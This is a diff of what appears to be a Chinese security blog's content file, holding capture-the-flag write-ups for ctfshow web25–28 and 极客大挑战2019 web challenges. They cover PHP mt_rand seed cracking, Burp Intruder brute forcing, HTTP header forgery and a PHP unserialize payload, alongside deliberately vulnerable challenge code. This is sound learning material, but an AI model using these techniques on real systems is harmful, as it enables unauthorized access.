-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">        <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">        <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;            </span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$rand</span>;        </span><br><span class="line">        &#125;                    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;   </span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(_FILE_);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>)</span><br><span class="line">&#125;                                                        </span><br><span class="line">    &#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h2 id="mt-srand-hexdec-substr-md5-flag-0-8"><a href="#mt-srand-hexdec-substr-md5-flag-0-8" class="headerlink" title="mt_srand(hexdec(substr(md5($flag),0,8)));"></a>mt_srand(hexdec(substr(md5($flag),0,8)));</h2><ul>
-<li>对flag进行MD5哈希处理，从MD5哈希值的开头截取8个字符(即32位中的前16位)，后将处理得到的值进行进制转化，hexdec()函数可以将截取的16位十六进制数转化成十进制数。最后使用转换的十进制数作为种子值来初始化mt_rand()函数的随机数生成器</li>
-<li>if((!$rand)){ if($_COOKIE[‘token’]&#x3D;&#x3D;(mt_rand()+mt_rand())){echo $flag;</li>
-</ul>
-<p>若$rand为0，则执行if语句</p>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路:"></a>解题思路:</h2><p>1.?r&#x3D;0先回显查看mt_rand()第一次的随机数</p>
-<h3 id="2-用php-rand-seed脚本"><a href="#2-用php-rand-seed脚本" class="headerlink" title="2.用php_rand_seed脚本"></a>2.用php_rand_seed脚本</h3><p>先用gcc编译脚本gcc -o php_mt_seed php_mt_seed.c</p>
-<p>爆破出之前播种的随机数种子的值.&#x2F;php_rand_seed 567219768</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/a26995fd26644e409374f8e4b4a79de7.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<p>seed选择kali工具得到的结果中php7的结果，然后编写php代码得到cookie的值:</p>
-<?php mt_srand(3147772674); echo mt_rand()."\n"; echo mt_rand()+mt_rand(); ?>
-
-<p>在网页cookie中放入得到的值，一个个尝试就可以得到flag了</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/fed24da88b9d4affaadf95138d5a8f69-1730818264224-14.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<h1 id="web26数据库连接信息爆破、"><a href="#web26数据库连接信息爆破、" class="headerlink" title="web26数据库连接信息爆破、"></a>web26数据库连接信息爆破、</h1><p>这题抓包就能拿到flag了，有点抽象</p>
-<h1 id="web27信息收集-日期爆破"><a href="#web27信息收集-日期爆破" class="headerlink" title="web27信息收集+日期爆破"></a>web27信息收集+日期爆破</h1><p>打开靶机，发现是个登录页面，需要学号和密码登录，猜测登录后可获得flag，则可围绕获得学号密码来进行，因为两者都不知道，直接爆破不太合适，看看还能提取到什么信息。</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/1c0c94f0642b40feac756cade867a00c-1730818268343-18.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<p>当点击到登录按钮下方的录取名单时，自动下载了一个list.xlsx，打开这个文件，发现了几个人的姓名和身份证号部分信息。点击录取名单下面的学生学籍信息查询系统，发现可以根据学生姓名和身份证号进行录取查询，那么第一步要做的可能就是要爆破身份证号了，或许在这里可以查到有用的信息。</p>
-<p>以下载的表格的第一个人为例，录取查询页面姓名栏输入高先伊，身份证输入6210225237</p>
-<ul>
-<li>打开抓包工具，如Burpsuit，点击查询，抓到查询发送的请求包，将请求包发送至Intruder攻击模块，将请求包中的&amp;p设置为变量</li>
-</ul>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/4cb7a0f41b8f4aa7b7fa7fc37173188c-1730818272849-22.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<ul>
-<li>设置payload</li>
-</ul>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/7f96d063ce374500bb095fd466a98b6b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<p>format那栏一定要写yyyyMMdd对应身份证的年月日，然后就开始爆破</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/a34dace7731241758d97f01c2f99847e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<p>爆破后找到长度最长的response，可以看到有success，把下面那串编码复制拿去翻译一下</p>
-<p>Unicode-str解码: 恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码</p>
-<p>然后我们就尝试登录一下，就可以拿到flag了</p>
-<h1 id="web28目录爆破"><a href="#web28目录爆破" class="headerlink" title="web28目录爆破"></a>web28目录爆破</h1><p>查看题目</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/f0cdd7485d6f4452a91636f0a0c6ce66.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<p>如果直接输 原url&#x2F;1&#x2F;2.txt 之类，会进行302跳转，然后跳转就会进入死循环，最后直接打不开</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/48101279d89f4247953766e2d3bb343f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<h2 id="知识点-302跳转"><a href="#知识点-302跳转" class="headerlink" title="知识点:302跳转"></a>知识点:302跳转</h2><p>302跳转又称暂时性转移，当网页临时移到新的位置，而浏览器的缓存没有更新时，就出现了302跳转。</p>
-<p>302状态码是临时重定向（Move Temporarily），表示所请求的资源临时地转移到新的位置，一般是24到48小时以内的转移会用到302。</p>
-<p>302重定向是临时的重定向，搜索引擎会抓取新的内容而保留旧的网址。因为服务器返回302代码，搜索引擎认为新的网址只是暂时的。</p>
-<p>这里我们对url后面两个目录进行爆破</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/ab9c43bf2d5b468e9568e24e1bc2855c.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<p>爆破模式改成Cluster bomb，然后将两个目录添加为变量</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/383c716113ef4a13823211a3b7f22eba.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/6c0e90a5663c4199965f4effcc1ce759.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<p>将两个变量都设置成numbers，从1到100，然后开始爆破，找到200状态码的就是成功的response，拿到flag</p>
 ]]></content>
       <categories>
         <category>ctfshow</category>
@@ -1327,46 +1373,252 @@
       </tags>
   </entry>
   <entry>
-    <title>浅谈Flask下ssti漏洞</title>
-    <url>/2024/11/07/%E6%B5%85%E8%B0%88ssti/</url>
-    <content><![CDATA[<h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>这几天做玄武杯碰上了ssti的签到题，由于之前没有了解过，所以只能先学去做这道题，但总体知识点还是不算很完善，所以给自己写篇文章，去梳理一下SSTI漏洞的知识点，但这篇文章是基于Flask下的SSTI漏洞的学习</p>
-<h1 id="0X02前置知识"><a href="#0X02前置知识" class="headerlink" title="0X02前置知识"></a>0X02前置知识</h1><h2 id="SSTI成因"><a href="#SSTI成因" class="headerlink" title="SSTI成因"></a>SSTI成因</h2><p>SSTI，服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。其实也就是模板引擎+注入，那么我们首先需要了解一下模板引擎</p>
-<h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>首先我们先讲解下什么是模板引擎，为什么需要模板</p>
-<p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，它可以生成特定格式的文档，利用模板引擎来生成前端的 HTML 代码，模板引擎会提供一套生成 HTML 代码的程序，然后只需要获取用户的数据，再放到渲染函数里，接着生成模板 + 用户数据的前端 HTML 页面，最后反馈给浏览器，呈现在用户面前。</p>
-<p>模板只是一种提供给程序解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
-<p>在后端渲染里，浏览器会接收到经过服务器计算的之后呈现给用户的HTML代码，此时计算就是服务器后端经过解析服务器端的模板来完成的。</p>
-<p>在前端渲染里，是浏览器从服务器拿到信息，再由浏览器前端来解析渲染这段信息变成用户可视化的HTML代码并呈现在用户面前。</p>
-<p>举个简单的例子</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;$name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+    <title>极客大挑战2019wp--web</title>
+    <url>/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web/</url>
+    <content><![CDATA[<h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>听说极客大挑战的题目挺好的，刚好ctfshow做累了，就去一个个复现去做题积累经验</p>
+<h1 id="0x02赛题"><a href="#0x02赛题" class="headerlink" title="0x02赛题"></a>0x02赛题</h1><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>打开题目</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111144846929.png" alt="image-20241111144846929"></p>
+<p>搜罗一圈之后没看到什么，Ctrl+u看一下源代码，然后在里面发现了一个Secret.php，访问看看</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111145020815-1731307826332-2.png" alt="image-20241111145020815"></p>
+<p>意思是我们不是来自<a href="https://sycsecret.buuoj.cn的访问,一看就知道是请求头信息伪造了/">https://Sycsecret.buuoj.cn的访问，一看就知道是请求头信息伪造了</a></p>
+<h3 id="知识点-请求头大全"><a href="#知识点-请求头大全" class="headerlink" title="知识点:请求头大全"></a>知识点:请求头大全</h3><p>Header			解释							示例</p>
+<p>Accept			指定客户端可以接收的内容类型	Accept:application&#x2F;json, text&#x2F;plain, <strong>&#x2F;</strong></p>
+<p>Accept-Charset	浏览器能够接受的字符编码集。	Accept-Charset: iso-8859-5</p>
+<p>Accept-Encoding	指定浏览器能够支持的web服务器返回内容压缩编码类型。	Accept-Encoding: gzip, deflate, br</p>
+<p>Accept-Language	浏览器可接受的语言			Accept-Language: zh-CN,zh;q&#x3D;0.9</p>
+<p>Accept-Ranges	能够请求网页实体的一个或者多个子范围字段	Accept-Ranges: bytes</p>
+<p>Authorization		HTTP受权的受权证书			Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ&#x3D;&#x3D;</p>
+<p>Cache-Control		指定请求和响应遵循的缓存机制	Cache-Control: max-age&#x3D;0</p>
+<p>Connection		表示是否须要持久链接。（HTTP 1.1默认进行持久链接）	Connection: keep-alive</p>
+<p>Cookie			HTTP请求发送时，会把保存在该请求域名下的全部cookie值一块儿发送给web服务器。	Cookie: OUTFOX_SEARCH_USER_ID&#x3D;<a href="mailto:&#x32;&#56;&#x30;&#x33;&#57;&#x32;&#50;&#x30;&#55;&#x40;&#x31;&#48;&#x2e;&#49;&#x31;&#48;&#46;&#57;&#54;&#46;&#x31;&#53;&#56;">&#x32;&#56;&#x30;&#x33;&#57;&#x32;&#50;&#x30;&#55;&#x40;&#x31;&#48;&#x2e;&#49;&#x31;&#48;&#46;&#57;&#54;&#46;&#x31;&#53;&#56;</a></p>
+<p>Content-Length	请求的内容长度	Content-Length: 348</p>
+<p>Content-Type		请求的与实体对应的MIME信息		Content-Type: application&#x2F;json;charset&#x3D;UTF-8</p>
+<p>Date			请求发送的日期和时间				Date: Tue, 15 Nov 2010 08:12:31 GMT</p>
+<p>Expect			请求的特定的服务器行为			Expect: 100-continue</p>
+<p>From			发出请求的用户的Email				From: <a href="mailto:&#x75;&#x73;&#x65;&#114;&#64;&#101;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;">&#x75;&#x73;&#x65;&#114;&#64;&#101;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;</a></p>
+<p>Host				指定请求的服务器的域名和端口号	Host: <a href="http://www.baidu.com/">www.baidu.com</a></p>
+<p>If-Match			只有请求内容与实体相匹配才有效		If-Match: “737060cd8c284d8af7ad3082f209582d”</p>
+<p>If-Modified-Since	若是请求的部分在指定时间以后被修改则请求成功，未被修改则返回304代码	If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</p>
+<p>If-None-Match		若是内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变	If-None-Match: “737060cd8c284d8af7ad3082f209582d”</p>
+<p>If-Range			若是实体未改变，服务器发送客户端丢失的部分，不然发送整个实体。参数也为Etag	If-Range: “737060cd8c284d8af7ad3082f209582d”</p>
+<p>If-Unmodified-Since	只在实体在指定时间以后未被修改才请求成功	If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</p>
+<p>Max-Forwards			限制信息经过代理和网关传送的时间		Max-Forwards: 10</p>
+<p>Pragma				用来包含实现特定的指令				Pragma: no-cache</p>
+<p>Proxy-Authorization		链接到代理的受权证书						Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ&#x3D;&#x3D;</p>
+<p>Range				只请求实体的一部分，指定范围						Range: bytes&#x3D;500-999</p>
+<p><strong>Referer				先前网页的地址，当前请求网页紧随其后,即来路			Referer: <a href="http://www.baidu.com/">www.baidu.com</a></strong></p>
+<p>TE					客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息	TE: trailers,deflate;q&#x3D;0.5</p>
+<p>Upgrade				向服务器指定某种传输协议以便服务器进行转换（若是支持）	Upgrade: HTTP&#x2F;2.0, SHTTP&#x2F;1.3, IRC&#x2F;6.9, RTA&#x2F;x11</p>
+<p><strong>User-Agent			User-Agent的内容包含发出请求的用户信息				User-Agent: Mozilla&#x2F;5.0 (Linux; X11)</strong></p>
+<p><strong>Via					通知中间网关或代理服务器地址，通讯协议						Via: 1.0 fred, 1.1 nowhere.com (Apache&#x2F;1.1)</strong></p>
+<p>Warning				关于消息实体的警告信息								Warn: 199 Miscellaneous warning</p>
+<p><strong>X-Forwarded-For		用来说明从哪里来的，一般用来内网伪装			X-Forwarded-For: 127.0.0.1</strong></p>
+<p>那就用bp抓包看看</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111145609789-1731308171053-4.png" alt="image-20241111145609789"></p>
+<h4 id="1-Referer伪造请求来源网页"><a href="#1-Referer伪造请求来源网页" class="headerlink" title="1.Referer伪造请求来源网页"></a>1.Referer伪造请求来源网页</h4><p>发现并没有referer头，那就只能自己伪造一个了</p>
+<p>Referer: <a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></p>
+<p>(记得放中间哈，放最后可能会send不出来)</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150156390-1731308518660-6.png" alt="image-20241111150156390"></p>
+<h4 id="2-User-Agent伪造请求用户"><a href="#2-User-Agent伪造请求用户" class="headerlink" title="2.User-Agent伪造请求用户"></a>2.User-Agent伪造请求用户</h4><p>User-Agent: Syclover</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150217001-1731308538274-8.png" alt="image-20241111150217001"></p>
+<h4 id="3-X-Forwarded-For内网伪装"><a href="#3-X-Forwarded-For内网伪装" class="headerlink" title="3.X-Forwarded-For内网伪装"></a>3.X-Forwarded-For内网伪装</h4><p>X-Forwarded-For: 127.0.0.1</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150322118-1731308603740-10-1731308605708-12-1731308607620-14-1731308609277-16.png" alt="image-20241111150322118"></p>
+<p>成功拿到flag！</p>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150708988-1731308832350-1.png" alt="image-20241111150708988"></p>
+<p>他说他有备份网址的习惯，盲猜是信息泄露</p>
+<p>先看看源代码</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150853118-1731308934392-3.png" alt="image-20241111150853118"></p>
+<h3 id="网站备份文件漏洞"><a href="#网站备份文件漏洞" class="headerlink" title="网站备份文件漏洞:"></a><strong>网站备份文件漏洞:</strong></h3><ul>
+<li>网站备份压缩文件 漏洞成因:在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</li>
+<li><strong>该漏洞的成因</strong>主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。</li>
+<li>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。</li>
+<li>被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</li>
+</ul>
+<p>没什么可用的信息，那就扫一下目录</p>
+<p><code>dirsearch -u &quot;url&quot; -e*</code></p>
+<p>目录文件有点多，我闲着无聊就猜测一下是不是<a href="http://www.zip/">www.zip</a></p>
+<p>url&#x2F;<a href="http://www.zip/">www.zip</a></p>
+<p>发现真的有</p>
+<p>解压下来看看</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111151654323-1731309415345-5.png" alt="image-20241111151654323"></p>
+<p>我以为到这里就结束了，结果发现是假的flag</p>
+<p>那就开其他文件看看</p>
+<p>在index.php中发现是页面源码，但多了几行代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br></pre></td></tr></table></figure>
 
-<p>这里我们希望呈现给用户的是用户自己的名字，但我们并不知道用户的名字是什么，这时候可以用一些用户的信息经过渲染到这个name变量里面，然后呈现给用户</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>wanth3f1ag<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>那我们再看看class.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>当然这只是最简单的示例，一般来说，至少会提供分支，迭代。还有一些内置函数。</p>
-<p>那什么是服务端模板注入呢</p>
-<h2 id="什么是ssti"><a href="#什么是ssti" class="headerlink" title="什么是ssti"></a>什么是ssti</h2><p>通过模板，我们可以将输入转化成特定的html文件，例如一些博客的页面，登录的时候可能会有“hello，wanth3f1ag”的回显，这时候wanth3f1ag可能就是通过我的个人身份信息进行渲染，渲染成html返回到页面。</p>
-<p>利用twig php模板引擎做个演示(这里是其他文章的例子哈)</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>( <span class="variable">$_GET</span>[‘custom_email’] , <span class="keyword">array</span>(“first_name” =&gt; <span class="variable">$user</span>.first_name) );</span><br></pre></td></tr></table></figure>
+<p>php反序列化</p>
+<p>先审代码</p>
+<h3 id="construct-魔术方法"><a href="#construct-魔术方法" class="headerlink" title="__construct()魔术方法"></a>__construct()魔术方法</h3><p>构造函数，当一个对象创建时被调用</p>
+<p>这里是对username和password进行初始化赋值</p>
+<h3 id="wake-魔术方法"><a href="#wake-魔术方法" class="headerlink" title="__wake()魔术方法"></a>__wake()魔术方法</h3><p><strong>调用unserialize()时触发</strong>，反序列化恢复对象之前调用该方法，正常来说<code>wakeup</code>魔术方法会先被触发，然后再进行反序列化</p>
+<p>这里触发wakeup方法会将username赋值成guest</p>
+<h3 id="destruct-魔术方法"><a href="#destruct-魔术方法" class="headerlink" title="__destruct()魔术方法"></a>__destruct()魔术方法</h3><p>析构函数，<strong>当一个对象销毁时被调用</strong></p>
+<p>里面有两个判断句，第一个是当password不等于100的时候会执行die()函数；第二个是当username等于admin的时候会输出flag</p>
+<p>所以我们需要让username等于admin和password为100就可以拿到flag</p>
+<p>我们构造pop链</p>
+<p><strong>Name::construct()-&gt;Name::destruct()</strong></p>
+<p>paylaod:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Name</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;100&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
 
-<p>先来解释一下这段代码的意思</p>
-<p>$twig-&gt;render()</p>
